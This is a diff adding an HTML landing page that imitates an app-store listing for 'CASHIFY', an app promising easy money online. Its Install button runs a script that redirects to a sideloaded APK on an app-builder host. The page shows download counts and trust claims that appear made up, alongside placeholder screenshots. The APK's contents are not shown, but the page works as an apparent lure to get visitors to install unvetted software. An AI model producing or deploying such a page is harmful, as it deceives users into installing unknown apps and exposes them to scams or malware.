@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CASHIFY - Download App</title>
+  <style>
+    :root {
+      --bg: #0d0d0d;
+      --card: #1c1c1c;
+      --accent: #00ffc3;
+      --text: #fff;
+      --muted: #888;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 30px 20px;
+    }
+
+    .app-header {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .app-icon {
+      width: 100px;
+      height: 100px;
+      border-radius: 20px;
+    }
+
+    .title {
+      font-size: 28px;
+      font-weight: bold;
+    }
+
+    .subtitle {
+      color: var(--muted);
+      font-size: 14px;
+      margin-top: 4px;
+    }
+
+    .install-button {
+      display: block;
+      width: 100%;
+      padding: 14px 0;
+      margin: 30px 0 20px;
+      background: var(--accent);
+      color: #000;
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      text-decoration: none;
+      transition: background 0.2s;
+    }
+
+    .install-button:hover {
+      background: #00c0a3;
+    }
+
+    .info {
+      font-size: 15px;
+      line-height: 1.6;
+      margin-bottom: 30px;
+    }
+
+    .screenshot-gallery {
+      display: flex;
+      gap: 10px;
+      overflow-x: auto;
+      padding-bottom: 10px;
+    }
+
+    .screenshot-gallery img {
+      height: 250px;
+      border-radius: 14px;
+      flex-shrink: 0;
+    }
+
+    .details {
+      background: var(--card);
+      padding: 20px;
+      border-radius: 12px;
+      margin-top: 30px;
+    }
+
+    .details-item {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid #333;
+      font-size: 14px;
+    }
+
+    .details-item:last-child {
+      border-bottom: none;
+    }
+
+    .download-msg {
+      display: none;
+      text-align: center;
+      font-size: 16px;
+      color: var(--accent);
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="app-header">
+      <img src="https://th.bing.com/th/id/OIG3.agwSn_KSOBpPJUr311cn?dpr=1,9&pid=ImgDetMain" class="app-icon" alt="App Icon">
+      <div>
+        <div class="title">CASHIFY</div>
+        <div class="subtitle">Finance · Make easy money online</div>
+      </div>
+    </div>
+
+    <a href="#" class="install-button" onclick="startDownload()">Install</a>
+    <div class="download-msg" id="downloadMsg">Starting download...</div>
+
+    <div class="info">
+      CASHIFY is your gateway to effortless earning. Tap, earn, and cash out — no fluff. Trusted by thousands to make extra cash online fast and easy.
+    </div>
+
+    <div class="screenshot-gallery">
+      <img src="https://via.placeholder.com/300x600/00ffc3/000000?text=Dashboard" alt="Screenshot 1">
+      <img src="https://via.placeholder.com/300x600/00ffc3/000000?text=Rewards" alt="Screenshot 2">
+      <img src="https://via.placeholder.com/300x600/00ffc3/000000?text=Withdraw" alt="Screenshot 3">
+    </div>
+
+    <div class="details">
+      <div class="details-item"><span>Version</span><span>1.0.0</span></div>
+      <div class="details-item"><span>Updated</span><span>March 22, 2025</span></div>
+      <div class="details-item"><span>Size</span><span>30 MB</span></div>
+      <div class="details-item"><span>Downloads</span><span>50K+</span></div>
+      <div class="details-item"><span>Offered by</span><span>CASHIFY Team</span></div>
+    </div>
+  </div>
+
+  <script>
+    function startDownload() {
+      const msg = document.getElementById('downloadMsg');
+      msg.style.display = 'block';
+      setTimeout(() => {
+        window.location.href = "https://apk.e-droid.net/apk/app3524161-29pqko.apk?v=1";
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
